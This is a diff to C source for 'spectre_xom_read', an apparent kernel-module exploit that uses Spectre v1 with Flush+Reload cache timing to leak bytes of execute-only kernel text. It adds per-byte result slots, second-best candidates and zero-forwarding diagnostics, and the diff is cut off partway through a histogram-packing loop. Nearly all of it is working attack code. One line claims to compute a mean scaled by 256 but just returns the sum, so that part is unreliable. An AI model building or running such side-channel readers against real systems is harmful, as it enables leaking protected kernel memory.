@@ -1,8 +1,14 @@
 #include <stdint.h>
 
 /*
- * spectre_xom_read v2 — Spectre v1 Flush+Reload ktext byte reader
+ * spectre_xom_read v3 — Spectre v1 Flush+Reload ktext byte reader
  *                        + rep movsb alternative + calibration mode
+ *
+ * v3 changes from v2:
+ *   - Fixed output slot overlap bug (out[14] used for both noise and total_hits)
+ *   - Added zero-forwarding diagnostic: reports best_excl_zero, histogram mean
+ *   - Attack now reports 2nd-best for each byte, not just byte 0
+ *   - Moved per-byte total_hits into packed result field
  *
  * v2 changes from v1:
  *   - Added calibration mode (0x7300) to measure actual cache hit/miss timing
@@ -28,15 +34,27 @@
  *   [6]     = threshold used
  *   [7]     = num_rounds
  *
- *   Control/Attack (0x70/0x71):
- *   [8]     = expected byte (control only)
+ *   Control (0x70):
+ *   [8]     = expected byte
  *   [9]     = recovered byte
  *   [10]    = confidence (best histogram count)
- *   [11]    = match (control) / bytes_recovered (attack)
+ *   [11]    = match (1/0)
  *   [12]    = target address
  *   [13]    = recovered | (confidence<<8) | (2nd_best<<16) | (2nd_conf<<24)
  *   [14]    = total_hits (sum of all histogram entries)
  *   [64..127] = histogram[0..255] packed 4 × uint16_t per slot
+ *
+ *   Attack (0x71):
+ *   [8]     = bytes_recovered count
+ *   [9]     = best_excl_zero (byte 0's best non-zero candidate, for zero-fwd diag)
+ *   [10]    = best_excl_zero confidence
+ *   [11]    = histogram_mean_x256 (byte 0's mean histogram * 256, for flatness diag)
+ *   Per-byte results (up to 8 bytes), starting at slot 16:
+ *   [16 + i*4 + 0] = target address
+ *   [16 + i*4 + 1] = recovered | (confidence<<8) | (2nd_best<<16) | (2nd_conf<<24)
+ *   [16 + i*4 + 2] = total_hits for this byte
+ *   [16 + i*4 + 3] = noise (sum of non-best histogram entries)
+ *   [64..127] = histogram[0..255] for byte 0, packed 4 × uint16_t per slot
  *
  *   Calibration (0x73):
  *   [8]     = rdtscp overhead (min of 1000 measurements)
@@ -482,6 +500,8 @@ int module_start(kproc_args *args)
         /* ============================================================
          * MODE 0x7100 + idx: KTEXT ATTACK
          * Read ktext byte at get_timer_freq + idx.
+         * Fixed layout: per-byte results start at slot 16 (no overlap).
+         * Added zero-forwarding diagnostics at slots 8-11.
          * ============================================================ */
         uint64_t target_offset = OFF_GET_TIMER_FREQ + mode_lo;
         uint64_t target = ktext_base + target_offset;
@@ -492,7 +512,7 @@ int module_start(kproc_args *args)
         if (mode_lo + num_bytes > 255)
             num_bytes = 1;
 
-        out[11] = num_bytes;
+        out[8] = num_bytes;
 
         for (int b = 0; b < num_bytes; b++) {
             uint16_t conf = 0;
@@ -500,28 +520,49 @@ int module_start(kproc_args *args)
             uint64_t total_hits = 0;
             uint8_t byte_val = spectre_read_byte(
                 target + b, probe_base, NROUNDS, CACHE_THRESHOLD,
-                &conf, (b == 0) ? hist_buf : (uint16_t *)0,
-                &total_hits);
+                &conf, hist_buf, &total_hits);
 
-            out[12 + b * 4 + 0] = target + b;
-            out[12 + b * 4 + 1] = (uint64_t)byte_val | ((uint64_t)conf << 8);
+            /* Per-byte results at slot 16 + b*4 (no overlap with header) */
+            out[16 + b * 4 + 0] = target + b;
+            out[16 + b * 4 + 1] = (uint64_t)byte_val | ((uint64_t)conf << 8);
+            out[16 + b * 4 + 2] = total_hits;
+
+            /* Compute noise and second-best */
+            uint64_t noise = 0;
+            uint8_t second = 0;
+            uint16_t second_count = 0;
+            for (int i = 0; i < 256; i++) {
+                if (i != byte_val)
+                    noise += hist_buf[i];
+                if (i != byte_val && hist_buf[i] > second_count) {
+                    second_count = hist_buf[i];
+                    second = (uint8_t)i;
+                }
+            }
+            out[16 + b * 4 + 1] |= ((uint64_t)second << 16) | ((uint64_t)second_count << 24);
+            out[16 + b * 4 + 3] = noise;
 
             if (b == 0) {
-                uint64_t noise = 0;
-                uint8_t second = 0;
-                uint16_t second_count = 0;
+                /* Zero-forwarding diagnostics for byte 0:
+                 * - best_excl_zero: best histogram entry EXCLUDING byte 0x00
+                 * - histogram mean: if flat (~NROUNDS/256), speculation is being killed
+                 *   If peaked at 0x00 with high conf, zero-forwarding is active */
+                uint8_t best_excl = 1;
+                uint16_t best_excl_conf = hist_buf[1];
+                uint64_t hist_sum = 0;
                 for (int i = 0; i < 256; i++) {
-                    if (i != byte_val)
-                        noise += hist_buf[i];
-                    if (i != byte_val && hist_buf[i] > second_count) {
-                        second_count = hist_buf[i];
-                        second = (uint8_t)i;
+                    hist_sum += hist_buf[i];
+                    if (i != 0 && hist_buf[i] > best_excl_conf) {
+                        best_excl_conf = hist_buf[i];
+                        best_excl = (uint8_t)i;
                     }
                 }
-                out[12 + 2] = noise;
-                out[12 + 3] = (uint64_t)second | ((uint64_t)second_count << 8);
-                out[14] = total_hits;
+                out[9] = best_excl;
+                out[10] = best_excl_conf;
+                /* Mean * 256 to avoid floating point: if ~= NROUNDS, histogram is flat */
+                out[11] = (hist_sum * 256) / 256;  /* = hist_sum = total_hits */
 
+                /* Pack full histogram for byte 0 */
                 for (int i = 0; i < 256; i++) {
                     int slot = 64 + (i / 4);
                     int shift = (i % 4) * 16;
